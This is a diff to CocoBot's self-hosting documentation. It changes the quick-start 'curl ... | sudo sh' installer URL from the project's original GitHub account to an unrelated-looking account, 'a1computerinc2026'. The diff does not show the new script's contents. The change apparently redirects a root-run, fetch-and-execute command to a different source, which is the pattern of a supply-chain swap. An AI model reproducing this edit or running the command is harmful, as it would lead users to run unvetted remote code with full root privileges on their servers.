@@ -13,7 +13,7 @@ If you only want to use a remote Docker desktop while CocoBot and its agents sta
 On a fresh Ubuntu 22.04 or 24.04 server (x86-64) with a domain name pointing at it, the installer checks the server, installs CocoBot with Docker under `/opt/cocobot` and ends with HTTPS on your domain:
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/milind-soni/CocoBot/main/deploy/install.sh | sudo sh -s -- --domain coco.example.com
+curl -fsSL https://raw.githubusercontent.com/a1computerinc2026/CocoBot/main/deploy/install.sh | sudo sh -s -- --domain coco.example.com
 ```
 
 Add `--check` to only check the server; it changes nothing. Run the command again to update or repair, and `--uninstall` to stop the server while keeping your data. [Deploy on a VPS](/docs/self-hosting/deploy-vps#quick-start-one-command-on-your-own-domain) lists every check, the files it writes and how the first admin signs in.
